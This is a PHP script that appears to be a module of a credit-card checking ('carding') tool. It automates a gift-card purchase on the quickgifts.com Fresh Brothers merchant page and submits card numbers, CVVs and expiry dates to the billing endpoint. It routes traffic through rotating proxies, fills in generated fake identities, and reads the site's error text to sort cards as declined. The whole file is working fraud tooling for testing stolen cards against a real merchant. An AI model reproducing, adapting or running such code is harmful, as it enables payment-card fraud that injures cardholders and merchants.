<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$cookie = uniqid();

$fake = $this->tools->GetUser();

$r1 = $this->curlx->Get('https://m-onelink.quickgifts.com/merchant/fresh-brothers', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$data = 'cardAmount=15&deliveryMethod=digital&mailRecipient=&sendDate=&shippingCarrier=&homeVisited=true&personalizeYeaNay=no&personalizeVisited=true&recipient%5BfirstName%5D='.$fake->first.'&recipient%5BlastName%5D='.$fake->last.'&recipient%5BemailAddress%5D='.urlencode($fake->email).'&recipientVisited=true&sendDate=02%2F05%2F2024&sendVisited=true';

$r8 = $this->curlx->Post('https://m-onelink.quickgifts.com/merchant/fresh-brothers/stepper', $data, null, $cookie, $server['proxy']);

if (!$r8->success) goto start;

sleep(5);

$r9 = $this->curlx->Get('https://m-onelink.quickgifts.com/merchant/fresh-brothers/preview', null, $cookie, $server['proxy']);

if (!$r9->success) goto start;

file_put_contents('unk_r9.txt', $r9->body);

$custom_id = $this->getstr($r9->body, 'data-card-id="', '"');

if (empty($custom_id)) {
	$empty = 'Ninth Request Token is Empty';

	goto start;
}

$data = 'form_add_to_cart=true&atc_type=&custom_id='.$custom_id.'&merchant_id=17295&denomination=15&delivery_method=digital&template_id=137&subject=&message=&send_date=02%2F05%2F2024&recipient_email='.urlencode($fake->email).'&recipient_first_name='.$fake->first.'&recipient_last_name='.$fake->last;

$r10 = $this->curlx->Post('https://m-onelink.quickgifts.com/merchant/fresh-brothers/preview', $data, null, $cookie, $server['proxy']);

if (!$r10->success) goto start;

$data = 'cc-number=4381+0814+0210+1456&cc-cvc='.$cvv.'&cc-exp='.$mm.'+%2F+'.$yy.'&cc-country=us&cc-first-name='.$fake->first.'&cc-last-name='.$fake->last.'&cc-email-address='.urlencode($fake->email).'&cc-phone=2564567654&cc-address1=12+main+street&cc-address2=&cc-city=Brewster&cc-state=NY&cc-zip=10509&_d_cc-city=&_d_cc-state=&_d_cc-zip=&cc-understand=on';

$r11 = $this->curlx->Post('https://m-onelink.quickgifts.com/merchant/fresh-brothers/billing', $data, null, $cookie, $server['proxy']);

if (!$r11->success) goto start;

$this->curlx->DeleteCookie();

if (empty($err = trim(strip_tags($this->getstr($r11->body, '<div class="ui-bar ui-body-a">', '</div>'))))) file_put_contents('unk_r11_no_err.txt', $r11->body . PHP_EOL, FILE_APPEND);

$empty = $err;

goto start;

end: